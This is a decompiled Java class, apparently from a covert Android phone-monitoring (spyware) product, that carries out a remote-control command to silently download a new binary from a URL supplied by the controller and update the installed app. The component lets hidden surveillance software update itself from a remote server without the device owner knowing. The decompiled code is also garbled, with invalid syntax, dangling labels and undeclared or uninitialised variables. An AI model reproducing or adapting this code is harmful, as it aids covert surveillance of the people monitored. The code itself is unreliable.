package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.base.RunningMode;
import com.vvt.productinfo.ProductInfoImpl;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.input.RmtCtrlInputDownloadBinaryAndUpdateSilentMode;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class bo {
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private RmtCtrlOutputStatusMessage c;
  private ControlCommand d;
  private RunningMode e;
  
  public bo(ControlCommand controlCommand) {
    this.c = new com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage();
    this.d = controlCommand;
  }
  
  private com.vvt.datadeliverymanager.a.a b() {
    bp localbp = new com.vvt.appengine.a.bp(this);
    return localbp;
  }
  
  public RmtCtrlOutputStatusMessage a(AppEngine1 paramh) {
    for (;;) {
      boolean bool1;
      Object localObject1;
      String str;
      long l1;
      long l2;
      try {
        bool1 = a;
        if (bool1) {}
        Object data = this.d.getData();
        if (!data instanceof RmtCtrlInputDownloadBinaryAndUpdateSilentMode) {
          break label324;
        }

        this.e = paramh.d();
        bool2 = a;
        if (bool2) {}

        if (this.e == RunningMode.NORMAL) {
          bool2 = false;
          localObject3 = null;
          this.c.setSuccess(false);
          this.c.setMessage("This command supported in Limited 1 or Full mode only.");
          bool1 = a;
          if (bool1) {}
          return this.c;
        }
        localObject1 = (RmtCtrlInputDownloadBinaryAndUpdateSilentMode)localObject1;
        localObject3 = ((RmtCtrlInputDownloadBinaryAndUpdateSilentMode)localObject1).getVersionNumber();
        localObject4 = paramh.o;
        localObject4 = ((ProductInfoImpl)localObject4).getProductVersion();
        bool2 = c.a((String)localObject3, (String)localObject4);
        boolean bool3 = a;
        if ((bool3) && (!bool2)) {
          break label290;
        }
        localObject3 = paramh.Z;
        if (localObject3 == null) {
          break label256;
        }
        str = ((RmtCtrlInputDownloadBinaryAndUpdateSilentMode)localObject1).getUrl();
        l1 = 0L;
      }
      finally {}
      try {
        localObject1 = ((RmtCtrlInputDownloadBinaryAndUpdateSilentMode)localObject1).getChecksum();
        l2 = Long.parseLong((String)localObject1);
      } catch (NumberFormatException localNumberFormatException) {
        bool1 = b;
        if (!bool1) {
          break label249;
        }
        l2 = l1;
        continue;
      }
      com.vvt.datadeliverymanager.a.a locala = b();
      paramh.Z.a(locala);
      paramh.Z.a(str, l2);
      continue;
      label249:
      label256:
      boolean bool2 = false;
      Object localObject3 = null;
      this.c.setSuccess(false);
      this.c.setMessage("AutoUpdateManager is NULL");
      continue;
      label290:
      bool2 = false;
      localObject3 = null;
      this.c.setSuccess(false);
      this.c.setMessage("The version on client is up to date");
      continue;
      label324:
      bool2 = false;
      localObject3 = null;
      this.c.setSuccess(false);
      this.c.setMessage("Invalid type. Expecting RmtCtrlInputUpdateAvailableSilentMode");
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bo.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */